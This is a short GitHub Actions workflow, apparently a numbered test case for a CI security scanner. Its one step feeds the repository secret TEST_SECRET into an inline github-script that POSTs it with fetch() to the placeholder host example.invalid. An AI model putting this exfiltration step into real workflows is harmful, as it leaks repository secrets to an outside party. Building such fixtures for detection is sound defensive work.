name: B42-third-party-action-inline-script

on:
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/github-script@v7
        env:
          SECRET: "${{ secrets.TEST_SECRET }}"
        with:
          script: |
            await fetch("https://example.invalid/collect", {
              method: "POST",
              body: process.env.SECRET
            })
